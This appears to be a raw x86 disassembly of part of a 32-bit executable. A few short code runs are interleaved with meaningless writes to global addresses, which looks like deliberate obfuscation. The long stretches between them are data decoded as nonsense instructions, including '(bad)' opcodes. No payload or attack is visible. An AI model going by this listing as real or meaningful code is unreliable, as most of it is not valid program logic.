  40a3f3:	outs   dx,DWORD PTR ds:[esi]
  40a3f4:	jecxz  0x40a472
  40a3f6:	cmp    al,0x6d
  40a3f8:	repz or ebp,ebx
  40a3fb:	fbld   TBYTE PTR [ebx-0x7]
  40a3fe:	gs aad 0x94
  40a401:	mov    edi,0xc0da987e
  40a406:	fld    TBYTE PTR [ebx+0x183a64f8]
  40a40c:	popf   
  40a40d:	mov    edx,DWORD PTR [ebp-0x4]
  40a410:	xor    edx,eax
  40a412:	adc    DWORD PTR ds:0x4336f3,0x43371f
  40a41c:	add    edx,ecx
  40a41e:	mov    DWORD PTR ds:0x43372b,0x68c0
  40a428:	cmp    edi,edx
  40a42a:	jb     0x40d767
  40a430:	mov    edx,DWORD PTR [ebp-0x28]
  40a433:	mov    edi,DWORD PTR [ebp-0x4]
  40a436:	xor    edx,eax
  40a438:	xor    ebx,ebx
  40a43a:	add    ebx,DWORD PTR ds:0x433663
  40a440:	and    DWORD PTR ds:0x43375f,ebx
  40a446:	xor    edi,eax
  40a448:	movzx  ebx,WORD PTR ds:0x433757
  40a44f:	sbb    DWORD PTR ds:0x433667,ebx
  40a455:	add    edi,ecx
  40a457:	add    DWORD PTR ds:0x4336f3,0x6da
  40a461:	add    edx,ecx
  40a463:	and    DWORD PTR ds:0x4336a7,0x0
  40a46d:	jmp    0x40a47f
  40a472:	mov    ebx,DWORD PTR ds:0x4336a7
  40a478:	inc    ebx
  40a479:	mov    DWORD PTR ds:0x4336a7,ebx
  40a47f:	cmp    DWORD PTR ds:0x4336a7,0x1c
  40a486:	jae    0x40a823
  40a48c:	cmp    DWORD PTR ds:0x4336a7,0x1e
  40a493:	jne    0x40a4a1
  40a499:	push   0x1
  40a49b:	call   DWORD PTR ds:0x412270
  40a4a1:	jmp    0x40a472
  40a4a6:	sbb    DWORD PTR ds:0x43376f,0x1f9a
  40a4b0:	jmp    0x40a823
  40a4b5:	shl    BYTE PTR [edi-0x482074c],cl
  40a4bb:	bnd jno 0x40a491
  40a4be:	lahf   
  40a4bf:	inc    edi
  40a4c0:	sbb    ebp,DWORD PTR [ebx-0x61]
  40a4c3:	mov    cl,0x2b
  40a4c5:	mov    edi,esi
  40a4c7:	jl     0x40a545
  40a4c9:	retf   0x7c79
  40a4cc:	jl     0x40a4fd
  40a4ce:	mov    dh,0xb2
  40a4d0:	mov    bh,0x64
  40a4d2:	js     0x40a4a2
  40a4d4:	mov    WORD PTR ds:0x77b857c1,ds
  40a4da:	adc    eax,DWORD PTR [ebp-0x3ac55bc]
  40a4e0:	sti    
  40a4e1:	jne    0x40a4ed
  40a4e3:	popa   
  40a4e4:	mov    esp,0x79c31b25
  40a4e9:	add    ecx,edx
  40a4eb:	std    
  40a4ec:	xchg   esp,eax
  40a4ed:	retf   0xfcc3
  40a4f0:	stc    
  40a4f1:	rol    BYTE PTR [edx+0x38146964],1
  40a4f7:	out    0xba,al
  40a4f9:	cmc    
  40a4fa:	and    eax,ebx
  40a4fc:	pusha  
  40a4fd:	cmp    DWORD PTR [ebp-0x1bf9fafb],ebx
  40a503:	scas   al,BYTE PTR es:[edi]
  40a504:	ret    
  40a505:	push   ecx
  40a506:	(bad)  
  40a507:	pop    esi
  40a508:	inc    ebx
  40a509:	push   ebp
  40a50a:	fwait
  40a50b:	test   al,0x5b
  40a50d:	or     eax,0xfa04b91
  40a512:	hlt    
  40a513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a514:	int    0x98
  40a516:	jp     0x40a4f1
  40a518:	pop    eax
  40a519:	mov    cl,0xb4
  40a51b:	push   cs
  40a51c:	sbb    eax,0x1ccd1002
  40a521:	mov    eax,ds:0x3cda63f5
  40a526:	jne    0x40a4d5
  40a528:	ins    BYTE PTR es:[edi],dx
  40a529:	scas   al,BYTE PTR es:[edi]
  40a52a:	sub    ah,BYTE PTR [edi]
  40a52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a52d:	push   es
  40a52e:	push   ecx
  40a52f:	das    
  40a530:	sti    
  40a531:	adc    DWORD PTR [eax],ecx
  40a533:	imul   ebp,esp,0x661ce319
  40a539:	retf   0x14db
  40a53c:	xor    al,0x7d
  40a53e:	(bad)  
  40a53f:	arpl   WORD PTR [ebx-0x471ddd42],bx
  40a545:	sub    eax,0x68cb22ef
  40a54a:	mov    al,0x4c
  40a54c:	lea    esp,[eax]
  40a54e:	push   cs
  40a54f:	adc    eax,0x3f25e6be
  40a554:	dec    eax
  40a555:	stc    
  40a556:	mul    DWORD PTR [edi+0x4f5ec137]
  40a55c:	inc    ecx
  40a55d:	cmp    eax,0xd7c1de21
  40a562:	or     edi,DWORD PTR [ebx-0x77]
  40a565:	dec    ebp
  40a566:	sbb    BYTE PTR [esi-0x3f],0xc8
  40a56a:	jl     0x40a590
  40a56c:	fmulp  st(2),st
  40a56e:	mov    al,0xb6
  40a570:	punpckhwd mm3,QWORD PTR [eax-0x3a]
  40a574:	sbb    eax,0x86a68bb2
  40a579:	frstor [esi+0x30]
  40a57c:	cli    
  40a57d:	clc    
  40a57e:	fisubr DWORD PTR [edi]
  40a580:	loope  0x40a54e
  40a582:	daa    
  40a583:	lods   ax,WORD PTR ds:[esi]
  40a585:	ins    BYTE PTR es:[edi],dx
  40a586:	jg     0x40a5cf
  40a588:	cmp    BYTE PTR [ecx+eiz*4],dl
  40a58b:	mov    ?,WORD PTR [edi+0x2ce48e69]
  40a591:	push   eax
  40a592:	dec    esi
  40a593:	mov    ds:0x46299eed,al
  40a598:	cmp    ah,BYTE PTR [eax-0x77]
  40a59b:	sahf   
  40a59c:	sbb    ecx,DWORD PTR [esi]
  40a59e:	lds    eax,FWORD PTR [ecx]
  40a5a0:	and    BYTE PTR [eax+0x217f3d71],0xe8
  40a5a7:	in     al,dx
  40a5a8:	xor    ecx,DWORD PTR [ecx+0x7e690049]
  40a5ae:	out    dx,eax
  40a5af:	fmul   QWORD PTR [esi+0x1f16b6a6]
  40a5b5:	sub    al,0x29
  40a5b7:	mov    BYTE PTR [ecx],dl
  40a5b9:	(bad)  
  40a5ba:	xchg   ebx,eax
  40a5bb:	call   0x57e9:0x3079cc9e
  40a5c2:	mov    bl,0x1e
  40a5c4:	in     al,0xb6
  40a5c6:	aam    0x2e
  40a5c8:	ds enter 0x68a,0x63
  40a5cd:	xor    BYTE PTR [edx+0x42],ah
  40a5d0:	aas    
  40a5d1:	or     edx,DWORD PTR [esi-0x67]
  40a5d4:	shl    DWORD PTR [ebx-0x66],0xfb
  40a5d8:	cs mov edx,0x31e0c6df
  40a5de:	add    al,0xd5
  40a5e0:	mov    ch,0x90
  40a5e2:	neg    ebx
  40a5e4:	dec    esi
  40a5e5:	and    BYTE PTR [eax],0x2f
  40a5e8:	(bad)  
  40a5e9:	and    esp,DWORD PTR [edi+0x30c12c1]
  40a5ef:	inc    eax
  40a5f0:	js     0x40a5f1
  40a5f2:	fwait
  40a5f3:	mov    esp,0xa051bad3
  40a5f8:	or     al,0x6a
  40a5fa:	xor    cl,BYTE PTR [esi]
  40a5fc:	inc    eax
  40a5fd:	adc    al,dl
  40a5ff:	push   edx
  40a600:	fcom   DWORD PTR [edx+0x14fb6d8a]
  40a606:	mul    BYTE PTR [ebx-0x350f9c5]
  40a60c:	mov    ebx,0x8af951b3
  40a611:	xchg   DWORD PTR [eax],ebx
  40a613:	jl     0x8a5b5f2d
  40a619:	popa   
  40a61a:	sbb    al,0xff
  40a61c:	xor    al,0xe1
  40a61e:	not    eax
  40a620:	fdivrp st(6),st
  40a622:	cwde   
  40a623:	cmp    eax,0x8514742c
  40a628:	in     al,dx
  40a629:	outs   dx,BYTE PTR ds:[esi]
  40a62b:	loope  0x40a5c4
  40a62d:	lods   al,BYTE PTR ds:[esi]
  40a62e:	aaa    
  40a62f:	and    BYTE PTR [ebx],dh
  40a631:	aaa    
  40a632:	fnsave [ebp+0x1366a435]
  40a638:	popf   
  40a639:	sbb    al,0x46
  40a63b:	xchg   esi,eax
  40a63c:	pop    esi
  40a63d:	xor    al,0x4
  40a63f:	(bad)  [edi+eax*2]
  40a642:	and    bh,BYTE PTR [edi+0x46]
  40a645:	sub    DWORD PTR [edi-0x26eef5a7],ebx
  40a64b:	ins    DWORD PTR es:[edi],dx
  40a64c:	das    
  40a64d:	repz push cs
  40a64f:	fdiv   DWORD PTR [ebx+0x30]
  40a653:	adc    eax,ecx
  40a655:	sbb    DWORD PTR [ecx+0x2e50d731],ebp
  40a65b:	pop    edx
  40a65c:	jns    0x40a5e9
  40a65e:	and    al,0xdf
  40a660:	mov    ebp,0xe2c9f715
  40a665:	outs   dx,DWORD PTR ds:[esi]
  40a666:	lds    eax,FWORD PTR [edi]
  40a668:	(bad)  
  40a669:	fneni(8087 only) 
  40a66b:	xchg   edx,eax
  40a66c:	repz dec eax
  40a66e:	mov    cl,BYTE PTR [ecx+ebp*2]
  40a671:	pop    esp
  40a672:	in     al,dx
  40a673:	push   edx
  40a674:	shl    DWORD PTR [eax-0x5c],0x97
  40a678:	sbb    al,0x6f
  40a67a:	adc    DWORD PTR [eax],esi
  40a67c:	js     0x40a6de
  40a67e:	and    BYTE PTR [eax],0xe3
  40a681:	fimul  WORD PTR [ebx+0x37eaa36c]
  40a687:	retf   
  40a688:	outs   dx,DWORD PTR ds:[esi]
  40a689:	in     eax,0x6b
  40a68b:	repnz test eax,0x1f02635f
  40a691:	add    DWORD PTR [ecx],0xffffff88
  40a694:	(bad)  
  40a695:	popa   
  40a696:	sub    BYTE PTR [ecx],ah
  40a698:	mov    dl,0xcf
  40a69a:	jle    0x40a677
  40a69c:	push   ebx
  40a69d:	rcl    DWORD PTR [eax-0x33],1
  40a6a0:	ja     0x40a68c
  40a6a2:	sub    BYTE PTR [eax],dh
  40a6a4:	push   edx
  40a6a5:	add    al,BYTE PTR [edi]
  40a6a7:	cdq    
  40a6a8:	frstor [edi]
  40a6aa:	cmp    dh,cl
  40a6ac:	jge    0x40a715
  40a6ae:	(bad)  
  40a6af:	cmp    eax,0x35b94d0f
  40a6b4:	shr    ebp,cl
  40a6b6:	sar    dh,cl
  40a6b8:	icebp  
  40a6b9:	outs   dx,DWORD PTR ds:[esi]
  40a6ba:	pop    edi
  40a6bb:	sbb    BYTE PTR gs:[edx],dl
  40a6be:	push   eax
  40a6bf:	fnstcw WORD PTR [ecx+0x5624ad82]
  40a6c5:	dec    eax
  40a6c6:	rcl    DWORD PTR [edx],1
  40a6c8:	addr16 sahf 
  40a6ca:	les    esi,FWORD PTR [ebx]
  40a6cc:	adc    BYTE PTR [esi+ecx*4-0x5e5f89a2],al
  40a6d3:	sub    ebp,ecx
  40a6d5:	xor    DWORD PTR [ebp-0x4d],edx
  40a6d8:	inc    eax
  40a6d9:	adc    edx,DWORD PTR [eax+0x30c75ad3]
  40a6df:	jl     0x40a685
  40a6e1:	repnz push esi
  40a6e3:	inc    esp
  40a6e4:	imul   ebp,ebx,0xe9bb902e
  40a6ea:	xchg   ebx,eax
  40a6eb:	loopne 0x40a6e5
  40a6ed:	adc    DWORD PTR [ecx+0x73],ecx
  40a6f0:	or     al,0x4c
  40a6f2:	jge    0x40a730
  40a6f4:	int    0x9a
  40a6f6:	and    cl,BYTE PTR [esi+0x493d0465]
  40a6fc:	or     ah,bl
  40a6fe:	lds    ebx,FWORD PTR [ecx]
  40a700:	pop    es
  40a701:	div    DWORD PTR [ebp+0x5d]
  40a704:	repnz lea edx,[ecx-0x53]
  40a708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a709:	inc    esi
  40a70a:	inc    BYTE PTR ds:0xd9275f24
  40a710:	sbb    bh,BYTE PTR [edi+0x5c2b6344]
  40a716:	ror    esi,1
  40a718:	and    eax,0xaeea596c
  40a71d:	add    dl,BYTE PTR [eax]
  40a71f:	imul   ebx,DWORD PTR [ebx+esi*4],0xbcb0aa9d
  40a726:	sbb    al,0x7b
  40a728:	add    ebp,DWORD PTR [edi+0x3d5be6c]
  40a72e:	sti    
  40a72f:	xor    ah,BYTE PTR [esi-0xe]
  40a732:	(bad)
  40a736:	popa   
  40a737:	jbe    0x40a6fb
  40a739:	mov    eax,0x7fe77ed8
  40a73e:	push   edi
  40a73f:	or     eax,0xfa0fcb22
  40a744:	inc    eax
  40a745:	add    ebp,ecx
  40a747:	pusha  
  40a748:	loop   0x40a763
  40a74a:	jmp    0xe3a1:0x89de4c94
  40a751:	add    ch,BYTE PTR [eax+0x5ab9e5e]
  40a757:	scas   al,BYTE PTR es:[edi]
  40a758:	gs mov eax,ebp
  40a75b:	push   0x9f1a1ab4
  40a760:	dec    eax
  40a761:	xchg   BYTE PTR [edi+eax*4],dl
  40a764:	imul   edx,DWORD PTR [esi],0x2d
  40a767:	inc    edi
  40a768:	inc    esi
  40a769:	das    
  40a76a:	loop   0x40a72b
  40a76c:	invd   
  40a76e:	lods   eax,DWORD PTR ds:[esi]
  40a76f:	jp     0x40a751
  40a771:	xchg   edi,eax
  40a772:	je     0x40a77c
  40a774:	pop    edx
  40a775:	daa    
  40a776:	shl    BYTE PTR [eax+0x7c],0xe7
  40a77a:	inc    ebp
  40a77b:	addr16 cwde 
  40a77d:	jge    0x40a7df
  40a77f:	mov    ebx,0x933354e4
  40a784:	cmp    edi,DWORD PTR [eax]
  40a786:	inc    eax
  40a787:	test   al,0x4c
  40a789:	xchg   BYTE PTR [ecx-0x79e9382e],bh
  40a78f:	dec    edi
  40a790:	clc    
  40a791:	stos   DWORD PTR es:[edi],eax
  40a792:	js     0x40a803
  40a794:	sbb    ebp,edi
  40a796:	mov    cl,0x50
  40a798:	int    0xb
  40a79a:	mov    dh,0xaa
  40a79c:	pop    esi
  40a79d:	ret    0xb3fc
  40a7a0:	mov    DWORD PTR fs:[esi+0x2e],ebx
  40a7a4:	and    esi,DWORD PTR [edi-0x4b1400e7]
  40a7aa:	jp     0x40a7d3
  40a7ac:	xor    esp,esi
  40a7ae:	fild   WORD PTR [ebx+edx*1+0x780b3ec1]
  40a7b5:	jae    0x40a815
  40a7b7:	push   esi
  40a7b8:	jmp    0x40a7ba
  40a7ba:	add    eax,0x270ff416
  40a7bf:	adc    WORD PTR [esi-0x70],ax
  40a7c3:	mov    ecx,0xb564b62a
  40a7c8:	mov    al,ds:0x2b8c1510
  40a7cd:	inc    ebx
  40a7ce:	addr16 mov al,ds:0xc886
  40a7d2:	push   0x21
  40a7d4:	rcr    DWORD PTR [ebx-0x4fed4afb],1
  40a7da:	sbb    eax,0x1a544341
  40a7df:	repz dec edx
  40a7e1:	int3   
  40a7e2:	pop    ebx
  40a7e3:	push   ecx
  40a7e5:	add    edx,eax
  40a7e7:	sub    eax,0x9095b1cf
  40a7ec:	pop    edi
  40a7ed:	loope  0x40a7d8
  40a7ef:	pop    ecx
  40a7f0:	jle    0x40a80e
  40a7f2:	push   ds
  40a7f3:	mov    dh,0x7a
  40a7f5:	inc    ebp
  40a7f6:	push   edx
  40a7f7:	lods   al,BYTE PTR ds:[esi]
  40a7f8:	scas   eax,DWORD PTR es:[edi]
  40a7f9:	mov    eax,esi
  40a7fb:	(bad)  
  40a7fd:	inc    ebx
  40a7fe:	into   
  40a7ff:	or     BYTE PTR [ebp+0x5468dbf9],bl
  40a805:	sub    esp,DWORD PTR [edi-0x15]
  40a808:	adc    bh,BYTE PTR [ebx-0x7b]
  40a80b:	fcomp  st(1)
  40a80d:	or     eax,0xc0f1f5f4
  40a812:	lods   al,BYTE PTR ds:[esi]
  40a813:	stc    
  40a814:	call   0x6142:0x64f11fed
  40a81b:	(bad)  
  40a81c:	(bad)  
  40a81d:	fstp   QWORD PTR [ecx+0x23]
  40a820:	bound  edi,QWORD PTR [ebp-0x2850f031]
  40a826:	adc    DWORD PTR ds:0x4336af,ebx
  40a82c:	mov    edi,DWORD PTR [ebp-0x8]
  40a82f:	or     DWORD PTR ds:0x4336ab,ecx
  40a835:	mov    ebx,DWORD PTR [ebp-0x10]
  40a838:	sub    ebx,edi
  40a83a:	cmp    ebx,edx
  40a83c:	mov    DWORD PTR ds:0x4336ef,0x652d
  40a846:	ja     0x40a872
  40a84c:	xor    edx,DWORD PTR ds:0x433697
  40a852:	mov    edx,DWORD PTR [ebp-0x4]
  40a855:	sbb    DWORD PTR ds:0x4336df,0x855
  40a85f:	xor    edx,eax
  40a861:	add    edx,ecx
  40a863:	mov    DWORD PTR ds:0x4336af,0x65c5
  40a86d:	jmp    0x40bab5
  40a872:	mov    ebx,DWORD PTR ds:0x433723
  40a878:	sub    ebx,DWORD PTR ds:0x43364f
  40a87e:	mov    DWORD PTR ds:0x433723,ebx
  40a884:	mov    edx,DWORD PTR [ebp-0x2c]
  40a887:	mov    edi,DWORD PTR [ebp-0x4]
  40a88a:	or     DWORD PTR ds:0x433697,ebx
  40a890:	xor    edx,eax
  40a892:	xor    edi,eax
  40a894:	movzx  ebx,BYTE PTR ds:0x433717
  40a89b:	adc    DWORD PTR ds:0x433653,ebx
  40a8a1:	add    edi,ecx
  40a8a3:	add    edx,ecx
  40a8a5:	imul   edx,edi
  40a8a8:	adc    DWORD PTR ds:0x4336a7,edi
  40a8ae:	mov    edi,DWORD PTR [ebp-0x8]
  40a8b1:	mov    ebx,DWORD PTR [ebp-0x10]
  40a8b4:	sub    ebx,edi
  40a8b6:	cmp    ebx,edx
  40a8b8:	ja     0x40a8c6
  40a8be:	mov    edx,DWORD PTR [ebp-0x28]
  40a8c1:	jmp    0x40baa7
  40a8c6:	mov    edx,DWORD PTR [ebp-0x30]
  40a8c9:	mov    edi,DWORD PTR [ebp-0x4]
  40a8cc:	xor    edx,eax
  40a8ce:	xor    edi,eax
  40a8d0:	jmp    0x40ac43
  40a8d5:	call   0x73960c99
  40a8da:	jge    0x40a8ce
  40a8dc:	pop    ecx
  40a8dd:	jno    0x40a8ff
  40a8df:	aad    0xd1
  40a8e1:	stos   DWORD PTR es:[edi],eax
  40a8e2:	ret    
  40a8e3:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a8e5:	addr16 lock jl 0x40a965
  40a8e9:	retf   0x7c79
  40a8ec:	jl     0x40a95b
  40a8ee:	cmp    esp,ebp
  40a8f0:	sbb    edi,DWORD PTR [ecx]
  40a8f2:	push   cs
  40a8f3:	sbb    bh,BYTE PTR [ebp-0x55]
  40a8f6:	shl    DWORD PTR [edi],1
  40a8f8:	inc    ebx
  40a8f9:	jg     0x40a89d
  40a8fb:	mov    edi,0x52caf7c3
  40a900:	dec    esp
  40a901:	out    0x49,al
  40a903:	lock jge 0x40a8ca
  40a906:	cmp    ebp,DWORD PTR [eax+0x20]
  40a909:	mov    ecx,0x3def7173
  40a90e:	or     eax,0x436ada0
  40a913:	(bad)  
  40a914:	jp     0x40a8a3
  40a916:	adc    ecx,DWORD PTR [ecx+ecx*2]
  40a919:	push   ecx
  40a91a:	(bad)  
  40a91c:	xor    BYTE PTR [esi-0x11],dl
  40a91f:	sub    al,0xde
  40a921:	jo     0x40a960
  40a923:	or     dl,BYTE PTR [ebp-0x21]
  40a926:	dec    ebp
  40a927:	add    eax,ecx
  40a929:	sbb    DWORD PTR [esi],ecx
  40a92b:	xor    eax,0x8cdac402
  40a930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a931:	ins    BYTE PTR es:[edi],dx
  40a932:	sbb    ebp,DWORD PTR [edi]
  40a934:	(bad)  
  40a935:	out    dx,eax
  40a936:	xor    esp,ebx
  40a938:	imul   edi,eax,0x31a99d96
  40a93e:	sub    DWORD PTR [esi],edx
  40a940:	mov    edx,DWORD PTR [ecx+0x796c74c2]
  40a946:	mov    esi,0x9fe33da9
  40a94b:	mov    ebx,ecx
  40a94d:	dec    edi
  40a94e:	push   0x4fe791be
  40a953:	sbb    DWORD PTR [ebx-0x7b],edx
  40a956:	fld    QWORD PTR [ecx+esi*4]
  40a959:	push   ecx
  40a95a:	iret   
  40a95b:	dec    edx
  40a95c:	jae    0x40a988
  40a95e:	dec    ebp
  40a95f:	int3   
  40a960:	sar    ecx,0xde
  40a963:	mov    ?,WORD PTR [eax+0x72]
  40a966:	call   0x1030:0x4f2557c5
  40a96d:	xchg   edi,eax
  40a96e:	pop    ds
  40a96f:	add    edx,DWORD PTR [edi-0x21]
  40a972:	sub    eax,0x300aca1a
  40a977:	sbb    eax,0xd8270bc7
  40a97c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a97d:	mov    BYTE PTR [esi+0x1c],cl
  40a980:	push   0xa7004932
  40a985:	fnstcw WORD PTR [edi]
  40a987:	call   0xa7d97007
  40a98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a98d:	xor    cl,BYTE PTR [ecx-0x3559f400]
  40a993:	mov    BYTE PTR cs:[edi+0x52f9b3e4],dl
  40a99a:	mov    fs,WORD PTR [ebx+0x21]
  40a99d:	loope  0x40aa0f
  40a99f:	sbb    eax,0x114e96f0
  40a9a4:	test   ch,ch
  40a9a6:	mov    al,ds:0x7b3fc061
  40a9ab:	xor    BYTE PTR [edi-0x5228670b],bh
  40a9b1:	dec    esp
  40a9b2:	mov    ebp,0xc2e84509
  40a9b7:	sub    al,0xd0
  40a9b9:	adc    cl,BYTE PTR [ecx+esi*1-0x2c]
  40a9bd:	jp     0x40a94f
  40a9bf:	(bad)  
  40a9c0:	aaa    
  40a9c1:	dec    si
  40a9c3:	mov    al,ds:0x10bdbffd
  40a9c8:	sub    ecx,ebx
  40a9ca:	inc    edi
  40a9cb:	mov    eax,0x1cef7463
  40a9d0:	sub    eax,0x404819af
  40a9d5:	sbb    ah,BYTE PTR [edx]
  40a9d7:	loopne 0x40aa25
  40a9d9:	popa   
  40a9da:	sar    bh,1
  40a9dc:	stos   DWORD PTR es:[edi],eax
  40a9dd:	pop    esi
  40a9de:	fucomi st,st(1)
  40a9e0:	retf   
  40a9e1:	jl     0x40a9c7
  40a9e3:	jbe    0x40a9b4
  40a9e5:	pop    ss
  40a9e6:	jb     0x40a99b
  40a9e8:	hlt    
  40a9e9:	xor    cl,cl
  40a9eb:	jmp    0x67e2:0xc61d283d
  40a9f2:	mov    cl,0x87
  40a9f4:	pop    ss
  40a9f5:	test   edi,ebx
  40a9f7:	mov    cl,0xa2
  40a9f9:	mov    BYTE PTR [esi],cl
  40a9fb:	rcl    BYTE PTR [edx-0x4a],0x27
  40a9ff:	sub    esp,ebx
  40aa01:	aas    
  40aa02:	push   ebp
  40aa03:	outs   dx,DWORD PTR ds:[esi]
  40aa04:	sar    DWORD PTR [esi-0x64795404],1
  40aa0a:	gs aas 
  40aa0c:	mov    ebp,0x14cdd981
  40aa11:	jmp    0x66e3:0x72e1684b
  40aa18:	jns    0x40a9b3
  40aa1a:	in     al,dx
  40aa1b:	mov    dl,0x5e
  40aa1d:	xchg   ebx,eax
  40aa1e:	pop    es
  40aa1f:	sub    DWORD PTR [ecx],0x1a
  40aa22:	sahf   
  40aa23:	or     dh,BYTE PTR [ebp-0x3f781845]
  40aa29:	adc    BYTE PTR [eax+0x3091f549],bl
  40aa2f:	inc    ecx
  40aa30:	(bad)  
  40aa31:	dec    ecx
  40aa32:	arpl   ax,bp
  40aa34:	mov    bh,0x7f
  40aa36:	std    
  40aa37:	add    ebp,esi
  40aa39:	dec    esi
  40aa3a:	inc    edx
  40aa3b:	pop    ebp
  40aa3c:	adc    al,0x38
  40aa3e:	and    BYTE PTR [ecx+0x7dddea77],ah
  40aa44:	call   0x57cdcdd7
  40aa49:	jbe    0x40aa73
  40aa4b:	adc    eax,0xc6a10bf2
  40aa50:	mov    BYTE PTR gs:[edx],dh
  40aa53:	test   al,0x74
  40aa55:	jb     0x40aa0e
  40aa57:	rcl    DWORD PTR [edx+edx*8+0x4d],0x51
  40aa5c:	lock jne 0x40aa6b
  40aa5f:	add    DWORD PTR [eax-0x188a220c],0xf57010f1
  40aa69:	dec    ebp
  40aa6a:	cdq    
  40aa6b:	sub    BYTE PTR [eax+eax*8-0x55],0xdc
  40aa70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa71:	fnsave [ecx+0x5f41b923]
  40aa77:	loope  0x40aa58
  40aa79:	sub    eax,0x545b3c6f
  40aa7e:	pop    ecx
  40aa7f:	or     ah,BYTE PTR [esi+0x739b4edb]
  40aa85:	imul   esp,ebp,0xfdfeb80f
  40aa8b:	xchg   ecx,eax
  40aa8c:	and    BYTE PTR [ecx-0x58],bl
  40aa8f:	imul   edx,eax,0xffffffbf
  40aa92:	push   ds
  40aa93:	push   esi
  40aa94:	retf   0x8d82
  40aa97:	jo     0x40aa39
  40aa99:	pushf  
  40aa9a:	retf   
  40aa9b:	popa   
  40aa9c:	inc    esp
  40aa9d:	dec    edi
  40aa9e:	jns    0x40aae7
  40aaa0:	and    eax,0x4081cae1
  40aaa5:	sub    BYTE PTR [edx+ebx*1-0x7d],bh
  40aaa9:	xor    DWORD PTR [esi],ebp
  40aaab:	mov    cl,0xb7
  40aaad:	and    dh,cl
  40aaaf:	or     BYTE PTR [edi+0x2a],dl
  40aab2:	sahf   
  40aab3:	(bad)  
  40aab4:	xchg   esp,eax
  40aab5:	aaa    
  40aab6:	or     BYTE PTR [ecx],ah
  40aab8:	cmp    eax,0xf8fe029d
  40aabd:	push   es
  40aabe:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aac0:	scas   al,BYTE PTR es:[edi]
  40aac1:	mov    edx,DWORD PTR [edi-0x27]
  40aac4:	push   cs
  40aac5:	adc    al,0x25
  40aac7:	fs aam 0xe0
  40aaca:	in     al,0x38
  40aacc:	mov    ebx,DWORD PTR [eax]
  40aace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aacf:	(bad)  
  40aad0:	stos   DWORD PTR es:[edi],eax
  40aad1:	mov    al,ds:0x30ef341e
  40aad6:	adc    eax,0xcdc7b205
  40aadb:	lods   eax,DWORD PTR ds:[esi]
  40aadc:	and    eax,0x92b1a886
  40aae1:	pop    esi
  40aae2:	add    edx,ebx
  40aae4:	retf   
  40aae5:	in     al,0x8e
  40aae7:	dec    esi
  40aae8:	mov    ch,0x51
  40aaea:	add    dl,0x84
  40aaed:	xchg   ecx,eax
  40aaee:	std    
  40aaef:	fisubr WORD PTR [eax-0x7dc276b2]
  40aaf5:	cmp    BYTE PTR [edi],dl
  40aaf7:	jg     0x40ab50
  40aaf9:	xor    eax,0xd97f3e75
  40aafe:	xchg   edi,eax
  40aaff:	fisub  DWORD PTR [esi+0x7f]
  40ab02:	leave  
  40ab03:	push   0x77e0aea6
  40ab08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab09:	data16 jo 0x40aac6
  40ab0c:	fwait
  40ab0d:	adc    bl,BYTE PTR [ebp+ebp*1+0x6]
  40ab11:	pop    ebp
  40ab12:	adc    DWORD PTR [ecx-0x4],eax
  40ab15:	aas    
  40ab16:	leave  
  40ab17:	jmp    0x40aae1
  40ab19:	xor    BYTE PTR [ecx],bh
  40ab1b:	scas   al,BYTE PTR es:[edi]
  40ab1c:	lds    esi,FWORD PTR [ecx+0xb5eceea]
  40ab22:	fld    DWORD PTR [ebx-0x5e44b90b]
  40ab28:	jnp    0x40ab8d
  40ab2a:	push   ds
  40ab2b:	rol    DWORD PTR [esi],0x34
  40ab2e:	pop    ecx
  40ab2f:	(bad)  [edx+0x4c]
  40ab32:	ja     0x40ab1d
  40ab34:	sub    ebp,DWORD PTR [esi+0x4b8aac15]
  40ab3a:	js     0x40ab05
  40ab3c:	inc    ecx
  40ab3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab3e:	shl    BYTE PTR [edx-0x3f],cl
  40ab41:	inc    ecx
  40ab42:	inc    edx
  40ab43:	mov    al,0xba
  40ab45:	cmp    ecx,eax
  40ab47:	test   eax,0xa2250eb1
  40ab4c:	loope  0x40aae3
  40ab4e:	fild   DWORD PTR [esi]
  40ab50:	je     0x40abc9
  40ab52:	fist   WORD PTR [edx-0x10]
  40ab55:	or     al,0xa1
  40ab57:	cmp    al,0xfd
  40ab59:	or     esp,DWORD PTR [eax+0x10f51139]
  40ab5f:	rcl    BYTE PTR [ecx+0x3f354eac],0xee
  40ab66:	pushf  
  40ab67:	dec    eax
  40ab68:	fwait
  40ab69:	push   ds
  40ab6a:	loop   0x40aba3
  40ab6c:	jmp    0x11fa34dd
  40ab71:	sub    ah,BYTE PTR [ecx]
  40ab73:	cwde   
  40ab74:	xlat   BYTE PTR ds:[ebx]
  40ab75:	push   edx
  40ab76:	add    edi,DWORD PTR [ebx]
  40ab78:	dec    ebx
  40ab79:	dec    ebp
  40ab7a:	mov    ds:0x56a35a00,eax
  40ab7f:	(bad)  
  40ab80:	sahf   
  40ab81:	iret   
  40ab82:	(bad)  
  40ab83:	xlat   BYTE PTR ds:[ebx]
  40ab84:	pop    ss
  40ab85:	repz scas eax,DWORD PTR es:[edi]
  40ab87:	inc    eax
  40ab88:	lods   al,BYTE PTR ds:[esi]
  40ab89:	sub    BYTE PTR [edi-0x18f1ba87],0x2f
  40ab90:	sbb    bh,BYTE PTR [ebp-0x48b43848]
  40ab96:	push   0x7606e8ab
  40ab9b:	add    esp,0x5
  40ab9e:	out    dx,al
  40ab9f:	retf   
  40aba0:	cmp    DWORD PTR [ebx],esi
  40aba2:	mov    ?,edx
  40aba4:	daa    
  40aba5:	rol    BYTE PTR [ecx+0x0],cl
  40aba8:	cmp    BYTE PTR [eax+0x6f],0x20
  40abac:	push   ebp
  40abad:	add    esi,esp
  40abaf:	jg     0x40ab83
  40abb1:	or     DWORD PTR [edi+0x53183762],edi
  40abb7:	(bad)  
  40abb8:	aam    0x6c
  40abba:	sub    DWORD PTR [ecx],edi
  40abbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
